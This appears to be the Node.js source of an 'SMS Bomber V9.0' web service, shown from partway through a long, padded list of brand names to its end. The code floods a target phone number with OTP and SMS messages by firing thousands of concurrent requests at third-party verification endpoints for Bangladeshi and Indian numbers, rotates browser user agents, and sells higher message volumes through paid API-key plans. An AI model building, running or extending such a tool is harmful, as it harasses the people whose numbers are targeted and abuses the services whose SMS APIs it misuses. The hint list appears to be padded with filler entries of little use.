        'goldmansachs', 'jpmorgan', 'blackrock', 'vanguard', 'fidelity', 'schwab',
        'etrade', 'robinhood', 'webull', 'm1finance', 'sofi', 'acorns', 'betterment',
        'wealthfront', 'stash', 'public', 'crypto.com', 'binance', 'coinbase',
        'kraken', 'gemini', 'kucoin', 'bitfinex', 'huobi', 'okx', 'bybit', 'gate.io',
        'bittrex', 'bitstamp', 'blockfi', 'nexo', 'celsius', 'ledger', 'trezor',
        'metamask', 'trustwallet', 'coinbasewallet', 'exodus', 'atomicwallet',
        'jaxx', 'guarda', 'coinomi', 'electrum', 'mycelium', 'bitpay', 'coinpayments',
        'nowpayments', 'coingate', 'blockchain', 'paxful', 'localbitcoins', 'hodlhodl',
        'bisq', 'uniswap', 'pancakeswap', 'sushi', 'curve', 'aave', 'compound',
        'yearn', 'balancer', 'makerdao', 'lido', 'rocketpool', 'staderlabs',
        'ankr', 'infura', 'alchemy', 'moralis', 'thirdweb', 'web3auth', 'torus',
        'magic', 'privy', 'walletconnect', 'eip4361', 'ens', 'ipfs', 'filecoin',
        'arweave', 'storj', 'sia', 'golem', 'render', 'livepeer', 'theta',
        'vechain', 'iota', 'hedera', 'algorand', 'avalanche', 'solana', 'polygon',
        'cardano', 'polkadot', 'kusama', 'near', 'cosmos', 'tezos', 'eos', 'tron',
        'neo', 'nem', 'iost', 'zilliqa', 'ontology', 'waves', 'elrond', 'harmony',
        'celo', 'flow', 'aptos', 'sui', 'sei', 'injective', 'osmosis', 'juno',
        'evmos', 'cronos', 'fantom', 'moonbeam', 'moonriver', 'astar', 'shiden',
        'kava', 'bandprotocol', 'chainlink', 'api3', 'thetafuel', 'iotex', 'helium',
        'filebase', 'spheron', 'akash', 'cudos', 'fetch', 'singularitynet',
        'oceanprotocol', 'covalent', 'thegraph', 'subgraph', 'ceramic', 'textile',
        'orbitdb', 'pinata', 'nft.storage', 'web3.storage', 'estuary', 'fleek',
        'ceramicnetwork', '3box', 'spruce', 'idx', 'orbis', 'crossbell', 'lensprotocol',
        'farcaster', 'orbit', 'deso', 'minds', 'gun', 'scuttlebutt', 'matrix',
        'rocketchat', 'zulip', 'mattermost', 'discourse', 'flarum', 'vanilla',
        'xenforo', 'phpbb', 'mybb', 'simplemachines', 'punbb', 'vbulletin',
        'ipboard', 'woltlab', 'burningboard', 'nodebb', 'ghostblog', 'writefreely',
        'plume', 'hugo', 'gatsby', 'nextjs', 'nuxt', 'sveltekit', 'astro',
        'vuepress', 'docsify', 'gitbook', 'notion', 'obsidian', 'roamresearch',
        'logseq', 'tiddlywiki', 'zettlr', 'trilium', 'anytype', 'craft', 'bear',
        'ulysses', 'scrivener', 'typora', 'marktext', 'notable', 'boostnote',
        'caret', 'ghostwriter', 'qownnotes', 'cherrytree', 'treepad', 'keynotenf',
        'tomboy', 'gnote', 'rednotebook', 'lifepim', 'essentialpim', 'mylifeorganized',
        'todoist', 'ticktick', 'todo.microsoft', 'tasks.google', 'wunderlist',
        'anydo', 'rememberthemilk', 'toodledo', 'evernote', 'onenote', 'notes.apple',
        'keep.google', 'simplenote', 'standardnotes', 'joplin', 'laverna', 'turtl',
        'paperwork', 'tagspaces', 'miro', 'mural', 'lucidspark', 'stormboard',
        'conceptboard', 'sketchboard', 'mindmeister', 'mindomo', 'xmind', 'coggle',
        'lucidchart', 'smartdraw', 'drawio', 'creately', 'gliffy', 'whimsical',
        'scribblar', 'twiddla', 'bubble', 'adalo', 'glide', 'outsystems', 'mendix',
        'powerapps', 'appian', 'pega', 'salesforceplatform', 'servicenowplatform',
        'zohocreator', 'airtable', 'smartsheet', 'monday', 'clickup', 'asana',
        'trello', 'jira', 'confluence', 'basecamp', 'teamwork', 'wrike', 'podio',
        'redmine', 'taiga', 'mantisbt', 'bugzilla', 'gitlab', 'github', 'bitbucket',
        'sourceforge', 'codeberg', 'gitee', 'gitkraken', 'sourcetree', 'fork',
        'tower', 'gitextensions', 'smartgit', 'gitcola', 'gitahead', 'gitfinder',
        'workingcopy', 'codehub', 'git2go', 'pocket', 'instapaper', 'readwise',
        'matter', 'feedly', 'inoreader', 'newsblur', 'theoldreader', 'netnewswire',
        'reeder', 'fieryfeeds', 'unread', 'lire', 'readkit', 'vienna', 'rssowl',
        'quiterss', 'liferea', 'feedreader', 'rssbandit', 'rssguard', 'fluentreader',
        'goodlinks', 'curtail', 'wallabag', 'shiori', 'linkace', 'raindrop',
        'bookmarkos', 'startme', 'papaly', 'booky', 'diigo', 'delicious',
        'pinboard', 'scoopit', 'paperli', 'flipboard', 'smartnews', 'news.google',
        'news.apple', 'news.yahoo', 'news.msn', 'news.aol', 'news.reddit',
        'news.twitter', 'news.facebook', 'news.linkedin', 'news.pocket',
        'news.instapaper', 'news.readwise', 'news.matter', 'news.feedly',
        'news.inoreader', 'news.newsblur', 'news.theoldreader', 'news.netnewswire',
        'news.reeder', 'news.fieryfeeds', 'news.unread', 'news.lire', 'news.readkit',
        'news.vienna', 'news.rssowl', 'news.quiterss', 'news.liferea',
        'news.feedreader', 'news.rssbandit', 'news.rssguard', 'news.fluentreader',
        'news.goodlinks', 'news.curtail', 'news.wallabag', 'news.shiori',
        'news.linkace', 'news.raindrop', 'news.bookmarkos', 'news.startme',
        'news.papaly', 'news.booky', 'news.diigo', 'news.delicious', 'news.pinboard',
        'news.scoopit', 'news.paperli', 'news.flipboard', 'news.smartnews',
        'news.googleapp', 'news.appleapp', 'news.yahooapp', 'news.msnapp',
        'news.aolapp', 'news.redditapp', 'news.twitterapp', 'news.facebookapp',
        'news.linkedinapp', 'news.pocketapp', 'news.instapaperapp', 'news.readwiseapp',
        'news.matterapp', 'news.feedlyapp', 'news.inoreaderapp', 'news.newsblurapp',
        'news.theoldreaderapp', 'news.netnewswireapp', 'news.reederapp',
        'news.fieryfeedsapp', 'news.unreadapp', 'news.lireapp', 'news.readkitapp',
        'news.viennaapp', 'news.rssowlapp', 'news.quiterssapp', 'news.lifereaapp',
        'news.feedreaderapp', 'news.rssbanditapp', 'news.rssguardapp',
        'news.fluentreaderapp', 'news.goodlinksapp', 'news.curtailapp',
        'news.wallabagapp', 'news.shioriapp', 'news.linkaceapp', 'news.raindropapp',
        'news.bookmarkosapp', 'news.startmeapp', 'news.papalyapp', 'news.bookyapp',
        'news.diigoapp', 'news.deliciousapp', 'news.pinboardapp', 'news.scoopitapp',
        'news.paperliapp', 'news.flipboardapp', 'news.smartnewsapp', 'news.opera',
        'news.brave', 'news.vivaldi', 'news.firefox', 'news.chrome', 'news.edge',
        'news.safari', 'news.duckduckgo', 'news.ecosia', 'news.qwant', 'news.startpage',
        'news.search', 'news.yandex', 'news.bing', 'news.yahoosearch', 'news.ask',
        'news.aolsearch', 'news.wolfram', 'news.perplexity', 'news.claude',
        'news.gemini', 'news.chatgpt', 'news.deepseek', 'news.copilot', 'news.grammarly',
        'news.hemingway', 'news.prowritingaid', 'news.quillbot', 'news.jasper',
        'news.copy.ai', 'news.writesonic', 'news.rytr', 'news.anyword', 'news.peppertype',
        'news.frase', 'news.surferseo', 'news.marketmuse', 'news.clearscope',
        'news.semrush', 'news.ahrefs', 'news.moz', 'news.spyfu', 'news.similarweb',
        'news.alexa', 'news.compete', 'news.quantcast', 'news.comscore', 'news.nielsen',
        'news.iri', 'news.npd', 'news.gartner', 'news.forrester', 'news.idc',
        'news.accenture', 'news.deloitte', 'news.pwc', 'news.ey', 'news.kpmg',
        'news.mckinsey', 'news.bcg', 'news.bain', 'news.oliverwyman', 'news.lek',
        'news.kearney', 'news.strategyand', 'news.rolandberger', 'news.adlittle',
        'news.alixpartners', 'news.fti', 'news.navigant', 'news.paconsulting',
        'news.bearingpoint', 'news.capgemini', 'news.atos', 'news.cognizant',
        'news.infosys', 'news.tcs', 'news.wipro', 'news.hcl', 'news.techmahindra',
        'news.lti', 'news.mphasis'
    ];

    for (const raw of rawList) {
        let api = { ...raw };
        
        // Normalize the data/url fields if they are functions from the Python translation
        let urlStr = typeof api.url === 'function' ? api.url('9999999999', 1) : api.url;
        
        // Deduplicate
        const key = `${api.method}::${urlStr}`;
        if (seen.has(key)) continue;
        seen.add(key);

        // Split BD vs IN based on domain name
        const isIN = INDIAN_HINTS.some(hint => urlStr.toLowerCase().includes(hint));
        
        if (isIN) {
            ind.push(api);
        } else {
            bd.push(api);
        }
    }

    return { bd, ind };
}

const { bd: BD_APIS, ind: INDIAN_APIS } = compileApis(RAW_MEGA_LIST);
console.log(`📡 BD APIs: ${BD_APIS.length}`);
console.log(`🇮🇳 IN APIs: ${INDIAN_APIS.length}`);

// ============================================================
// JOB STORE
// ============================================================
class JobStore {
  constructor() { this.active = new Map(); this.completed = new Map();
    this.stats = { totalJobs: 0, totalSuccess: 0, totalFailed: 0, startTime: Date.now() }; }
  create({ phone, region, total, opts = {} }) {
    const id = Utility.generateJobId();
    const job = { id, phone, masked: Utility.maskPhone(phone), region, total, sent: 0,
      success: 0, fail: 0, startTime: Date.now(), status: 'active', opts, errors: [], stopped: false };
    this.active.set(id, job); this.stats.totalJobs++; return id;
  }
  isActive(id) { const j = this.active.get(id); return j && !j.stopped && j.status === 'active'; }
  stop(id) { const j = this.active.get(id); if (!j) return false;
    j.stopped = true; j.status = 'stopped'; j.endTime = Date.now();
    this.active.delete(id); this.completed.set(id, j); return true; }
  stopAll(region = null) { let c = 0;
    for (const [id, j] of [...this.active.entries()]) {
      if (region && j.region !== region) continue;
      if (this.stop(id)) c++;
    } return c; }
  bump(id, ok, err = null) {
    const j = this.active.get(id); if (!j || j.stopped) return;
    j.sent++;
    if (ok) { j.success++; this.stats.totalSuccess++; }
    else { j.fail++; this.stats.totalFailed++; if (err && j.errors.length < 30) j.errors.push(String(err).slice(0, 200)); }
    if (j.sent >= j.total) { j.status = 'completed'; j.endTime = Date.now();
      this.active.delete(id); this.completed.set(id, j); }
  }
  view(id) {
    const j = this.active.get(id) || this.completed.get(id); if (!j) return null;
    return { id: j.id, phone: j.masked, region: j.region, total: j.total, sent: j.sent,
      success: j.success, fail: j.fail,
      progress: ((j.sent / j.total) * 100).toFixed(2) + '%', status: j.status,
      start: j.startTime, end: j.endTime || null, stopped: j.stopped, errors: j.errors.slice(-5) };
  }
  all() { const out = [];
    for (const j of this.active.values()) out.push(this.view(j.id));
    for (const j of this.completed.values()) out.push(this.view(j.id));
    return out; }
  summary() {
    const tot = this.stats.totalSuccess + this.stats.totalFailed;
    return { totalJobs: this.stats.totalJobs, totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: tot > 0 ? ((this.stats.totalSuccess / tot) * 100).toFixed(2) + '%' : '0%',
      active: this.active.size, completed: this.completed.size,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memory: Utility.getMemoryUsage() };
  }
}
const jobs = new JobStore();

// ============================================================
// KEYS + RATE
// ============================================================
const PLAN_CONFIG = {
  default: { name: 'Default', maxCount: 300, requiresKey: false },
  free: { name: 'Free', maxCount: 50, requiresKey: false },
  premium: { name: 'Premium', maxCount: 10000, requiresKey: true },
  enterprise: { name: 'Enterprise', maxCount: 50000, requiresKey: true },
  unlimited: { name: 'Unlimited', maxCount: 100000, requiresKey: true }
};
class KeyManager {
  constructor() { this.file = path.join(__dirname, 'keys.json'); this.keys = this.load(); }
  load() { try { if (fs.existsSync(this.file)) {
    const data = JSON.parse(fs.readFileSync(this.file, 'utf8')); const m = new Map();
    Object.entries(data).forEach(([k, v]) => m.set(k, { expiry: new Date(v.expiry), plan: v.plan, usageCount: v.usageCount || 0 }));
    return m;
  }} catch {} return new Map(); }
  save() { const obj = {};
    for (const [k, v] of this.keys.entries()) obj[k] = { expiry: v.expiry.toISOString(), plan: v.plan, usageCount: v.usageCount || 0 };
    fs.writeFileSync(this.file, JSON.stringify(obj, null, 2)); }
  mint(plan = 'premium', days = 30) {
    const key = Utility.generateApiKey();
    const expiry = new Date(); expiry.setDate(expiry.getDate() + days);
    this.keys.set(key, { expiry, plan, usageCount: 0 }); this.save();
    return { apiKey: key, expiryDate: expiry, plan }; }
  validate(key) { return this.keys.has(key) && new Date() < this.keys.get(key).expiry; }
  info(key) {
    if (!this.keys.has(key)) return null;
    const k = this.keys.get(key);
    return { key, plan: k.plan, expires: k.expiry.toISOString(), valid: new Date() < k.expiry,
      daysLeft: Math.max(0, Math.ceil((k.expiry - new Date()) / 86400000)), usageCount: k.usageCount }; }
  use(key) { const k = this.keys.get(key); if (!k) return false;
    k.usageCount = (k.usageCount || 0) + 1; this.save(); return true; }
  all() { const out = [];
    for (const [k, v] of this.keys.entries()) out.push({ key: k, plan: v.plan, expires: v.expiry.toISOString(), valid: new Date() < v.expiry, usageCount: v.usageCount || 0 });
    return out; }
}
const keys = new KeyManager();

// ============================================================
// ENGINE
// ============================================================
function expandBody(obj, phone) {
  if (obj === null || obj === undefined) return obj;
  if (Array.isArray(obj)) return obj.map(v => expandBody(v, phone));
  if (typeof obj === 'object') { const o = {}; for (const [k, v] of Object.entries(obj)) o[k] = expandBody(v, phone); return o; }
  if (typeof obj === 'string') return obj.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
  return obj;
}

async function callOne(api, phone, jobId) {
  if (!jobs.isActive(jobId)) return { stopped: true };
  
  let url = typeof api.url === 'function' ? api.url(phone, 1) : api.url;
  url = url.replace(/{phone}/g, phone).replace(/{ts}/g, Date.now());
  
  const headers = getHeaders(api.headers || {});
  const cfg = { method: api.method || 'GET', url, headers, timeout: CONFIG.performance.timeout, validateStatus: () => true, maxRedirects: 3 };
  
  if (api.method === 'POST' || api.method === 'PUT') {
    let body = api.body || (typeof api.data === 'function' ? api.data(phone, 1) : api.data);
    if (body) {
      cfg.data = expandBody(body, phone);
      if (!cfg.headers['Content-Type'] && !cfg.headers['content-type']) {
        cfg.headers['Content-Type'] = 'application/json';
      }
    }
  }
  
  let status = 0, ok = false, errMsg = null;
  try { const r = await axios(cfg); status = r.status; ok = status >= 200 && status < 500; }
  catch (e) { status = e.response ? e.response.status : 0; errMsg = (e.code || e.message || 'ERR').slice(0, 120); }
  return { ok, status, error: errMsg };
}

async function blast(apis, phone, count, jobId, region) {
  const tasks = [];
  for (const api of apis) {
    for (let i = 0; i < count; i++) {
      if (!jobs.isActive(jobId)) break;
      tasks.push(callOne(api, phone, jobId).then(r => {
        if (!r.stopped) jobs.bump(jobId, r.ok, r.error);
      }));
    }
    if (!jobs.isActive(jobId)) break;
  }
  const t0 = Date.now();
  await Promise.allSettled(tasks);
  console.log(`💥 ${region} job ${jobId}: ${tasks.length} calls in ${Date.now() - t0}ms`);
  return { fired: tasks.length };
}

function getHeaders(extra = {}) {
  const UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
  ];
  return { 'User-Agent': UA[Math.floor(Math.random() * UA.length)], 'Accept': 'application/json, text/plain, */*', 'Connection': 'keep-alive', ...extra };
}

// ============================================================
// EXPRESS
// ============================================================
const app = express();
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

app.get('/', (req, res) => {
  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V9.0-SPLIT running' });
});

app.get('/api/health', (req, res) => {
  res.json({ status: 'active', version: "9.0.0", bd_apis: BD_APIS.length, india_apis: INDIAN_APIS.length, active_jobs: jobs.active.size });
});

app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  let currentPlan = 'default', planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }
  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
  const clean = Utility.parsePhone(number);
  if (!Utility.isValidBD(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
  let per = parseInt(count) || 1; if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
  const jobId = jobs.create({ phone: clean, region: 'BD', total: BD_APIS.length * per });
  blast(BD_APIS, clean, per, jobId, 'BD').catch(e => { console.error(e); jobs.stop(jobId); });
  res.json({ success: true, jobId, region: 'BD', total_apis: BD_APIS.length, total_sms: BD_APIS.length * per, stop_endpoint: `/api/stop?jobId=${jobId}` });
});

app.get('/api/India', async (req, res) => {
  if (req.query.stop !== undefined) {
    const jobid = req.query.jobid || req.query.jobId;
    if (jobid === 'all' || req.query.stop === 'all') return res.json({ success: true, stopped_count: jobs.stopAll('IN') });
    if (!jobid) return res.status(400).json({ success: false, error: 'jobid required' });
    return res.json({ success: jobs.stop(jobid) });
  }
  const { number, count = 1, plan, key } = req.query;
  let currentPlan = 'default', planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }
  if (planConfig.requiresKey) {
    if (!key || !keys.validate(key)) return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY });
    keys.use(key);
  }
  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
  const clean = Utility.normalizeIN(number);
  if (!Utility.isValidIN(clean)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
  let per = parseInt(count) || 1; if (per < 1) per = 1;
  if (per > planConfig.maxCount) return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount}` });
  const jobId = jobs.create({ phone: clean, region: 'IN', total: INDIAN_APIS.length * per });
  blast(INDIAN_APIS, clean, per, jobId, 'IN').catch(e => { console.error(e); jobs.stop(jobId); });
  res.json({ success: true, jobId, region: 'IN', total_apis: INDIAN_APIS.length, total_sms: INDIAN_APIS.length * per, stop_endpoint: `/api/India?stop&jobid=${jobId}` });
});

app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, stopped_count: jobs.stopAll() });
  if (jobId) return res.json({ success: jobs.stop(jobId), jobId });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
});

app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const j = jobs.view(jobId);
    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND });
    return res.json({ success: true, job: j });
  }
  res.json({ success: true, stats: jobs.summary(), jobs: jobs.all() });
});

app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found' }));

const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
  console.log(`\n🚀 SMS BOMBER V9.0-SPLIT (MEGA)`);
  console.log(`📊 BD ${BD_APIS.length}  |  IN ${INDIAN_APIS.length}`);
  console.log(`✅ ready\n`);
});
server.timeout = 120000;
